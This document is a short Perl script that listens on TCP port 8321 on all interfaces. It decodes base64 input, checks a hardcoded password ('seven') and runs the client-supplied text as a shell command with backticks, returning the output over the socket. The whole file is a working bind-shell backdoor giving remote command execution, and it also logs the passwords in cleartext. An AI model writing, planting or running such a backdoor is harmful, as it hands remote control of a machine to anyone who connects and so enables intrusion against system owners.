use IO::Socket::INET;
use MIME::Base64;

$| = 1;

my $socket = new IO::Socket::INET (
    LocalHost => '0.0.0.0',
    LocalPort => '8321',
    Proto => 'tcp',
    Listen => 5,
    Reuse => 1
);
die "NO SOCKET CREATED $!\n" unless $socket;

print "listening 8321\n";

my $our_key = "seven";
while(1)
{

    my $client_socket = $socket->accept();
    my $client_address = $client_socket->peerhost();
    my $client_port = $client_socket->peerport();
    print "connection from $client_address:$client_port\n";

    # read up to 1024 characters from the connected client
    my $data = "";
    $client_socket->recv($data, 1024);

    $data = decode_base64($data);
    my $password =  (split(/\n/, $data))[-1];
    $data =  (split(/\n/, $data))[0];
    print $password;
    print $our_key;
    if ($password eq $our_key) {

      print "data $data";
      print "Client req: $data\n";

      print "[$client_address $client_port] $_";
      my @out = `$data`;
      print $client_socket "$.: @out";
    } else {
      print $client_socket "$.: Bye";
    }
    shutdown($client_socket, 1);
}

$socket->close();
